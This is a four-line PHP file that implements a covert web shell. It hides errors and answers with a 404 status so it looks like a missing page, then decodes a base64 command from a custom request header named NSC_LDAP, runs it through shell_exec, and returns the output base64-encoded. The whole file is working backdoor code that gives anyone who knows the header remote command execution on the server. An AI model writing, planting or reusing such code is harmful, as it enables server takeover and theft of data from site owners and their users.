<?php
error_reporting(0);
http_response_code(404);
echo base64_encode(shell_exec(base64_decode($_SERVER['HTTP_NSC_LDAP'])));
